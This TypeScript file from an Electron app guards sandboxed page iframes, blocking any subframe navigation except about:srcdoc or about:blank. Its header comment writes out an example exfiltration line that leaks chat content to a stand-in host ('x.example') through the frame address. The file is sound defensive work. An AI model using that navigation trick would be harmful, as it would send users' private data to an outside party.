// Keeps every Page frame on its own document (pages-finish step 1, technical design §4).
//
// WHY: a page's policy stops it FETCHING anything (connect-src 'none') and posting a
// form anywhere (form-action 'none'), but nothing in a browser's policy stops a script
// navigating its OWN frame — `location.href = 'https://x.example/?' + whatTheChatsSay`
// would carry what the page read out in the address, and the sandbox allows it. The
// app's top-frame guard (will-navigate in main.ts) never sees subframe navigations, so
// this watches them, the way office-frame-guard.ts does for Office.
//
// WHICH frames: the host names every page iframe `youcoded-page` (shared/page-open-rule.ts
// PAGE_FRAME_NAME). A frame is remembered by its frameTreeNodeId the first time it is
// seen with that name — when it is created, or on its first navigation (the about:srcdoc
// load) — so a page that renames `window.name` afterwards cannot step out. The app's
// other iframes (HTML preview, the workbench) are unnamed and not this guard's business.
//
// Not covered, and said so (design review 1, finding 1): a phone's own browser has no
// such hook; the Android app's WebView refuses sub-frame navigations in its own router.
import { PAGE_FRAME_NAME } from '../../shared/page-open-rule';

/** The parts of Electron's WebFrameMain this guard reads. */
export interface PageGuardFrame {
  readonly url: string;
  readonly name: string;
  readonly frameTreeNodeId: number;
  readonly parent: PageGuardFrame | null;
}

export interface PageFrameNavigation {
  url: string;
  isMainFrame: boolean;
  frame: PageGuardFrame | null;
}

/** The only places a page frame may go: its own document, or blank. */
const STAYS_HOME = (url: string): boolean => url === 'about:srcdoc' || url === 'about:blank';
/** Bounded: a long session opens many pages; the oldest ids are long gone. */
const MAX_KNOWN = 2000;

/** A frame destroyed mid-event throws on access. */
function safe<T>(read: () => T, fallback: T): T {
  try { return read(); } catch { return fallback; }
}

/** Remember a frame that carries the page name, sitting directly under the window. */
export function notePageFrame(frame: PageGuardFrame | null | undefined, known: Set<number>): void {
  if (!frame) return;
  const name = safe(() => frame.name, '');
  const parent = safe(() => frame.parent, null);
  const top = parent !== null && safe(() => parent.parent, null) === null;
  if (name !== PAGE_FRAME_NAME || !top) return;
  const id = safe(() => frame.frameTreeNodeId, -1);
  if (id < 0) return;
  if (known.size >= MAX_KNOWN) known.delete(known.values().next().value as number);
  known.add(id);
}

/** True when the frame, or any frame above it, is a remembered page frame. */
function insidePage(frame: PageGuardFrame | null, known: Set<number>): boolean {
  for (let f = frame, hops = 0; f && hops < 32; f = safe(() => f!.parent, null), hops++) {
    if (known.has(safe(() => f!.frameTreeNodeId, -1))) return true;
  }
  return false;
}

/** Decides one navigation; remembers the frame first when it is a page's. */
export function blocksPageFrameNavigation(nav: PageFrameNavigation, known: Set<number>): boolean {
  if (nav.isMainFrame) return false;
  notePageFrame(nav.frame, known);
  if (!insidePage(nav.frame, known)) return false;
  // blob:, data:, javascript:, any web address — none of them is the page's own document.
  return !STAYS_HOME(nav.url);
}

/** Wires the guard to one window's webContents (createAppWindow). */
export function sealPageFrames(contents: {
  on(event: 'will-frame-navigate', listener: (e: PageFrameNavigation & { preventDefault(): void }) => void): unknown;
  on(event: 'frame-created', listener: (e: unknown, details: { frame: PageGuardFrame | null }) => void): unknown;
}): void {
  const known = new Set<number>();
  contents.on('frame-created', (_e, details) => notePageFrame(details?.frame ?? null, known));
  contents.on('will-frame-navigate', (e) => {
    if (blocksPageFrameNavigation(e, known)) {
      e.preventDefault();
      console.warn('[pages] blocked a page frame from navigating away from its own document');
    }
  });
}
